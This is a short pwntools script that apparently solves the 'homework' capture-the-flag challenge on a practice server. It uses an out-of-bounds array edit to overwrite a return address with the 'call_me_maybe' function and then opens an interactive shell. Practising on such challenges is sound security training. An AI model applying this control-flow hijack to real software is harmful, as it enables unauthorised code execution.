from pwn import *

#io = process("./homework")
io = remote( "hackme.inndy.tw" , 7701  )
elf = ELF("./homework")

sys_addr = elf.symbols['call_me_maybe']
#print(sys_addr)

name = 'LB@10.0.0.55'
io.sendlineafter("name? ",name)

io.sendlineafter( "> ", "1" )
io.sendlineafter( "edit: " , '14' )
io.sendlineafter( "many? ", str(sys_addr) )
io.sendlineafter( "> ", '0' )

io.interactive()
